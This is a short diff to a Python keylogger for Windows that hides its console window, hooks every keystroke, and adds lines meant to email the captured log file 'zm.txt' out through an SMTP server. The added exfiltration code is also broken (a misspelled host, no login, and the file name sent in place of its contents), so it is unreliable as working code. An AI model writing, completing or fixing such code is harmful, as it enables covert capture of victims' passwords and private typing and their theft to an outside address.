@@ -2,6 +2,7 @@ import win32api
 import win32console 
 import win32gui 
 import pythoncom, pyHook 
+import smtplib
 
 win = win32console.GetConsoleWindow() 
 win32gui.ShowWindow(win, 0) 
@@ -29,3 +30,9 @@ hm.KeyDown = OnKeyboardEvent
 hm.HookKeyboard() 
 
 pythoncom.PumpMessages() 
+
+server=smtplib.SMTP('smpt.gmail', 587)
+
+msg="zm.txt"
+
+server.sendmail("you@gmail.com","target@example.com",msg)
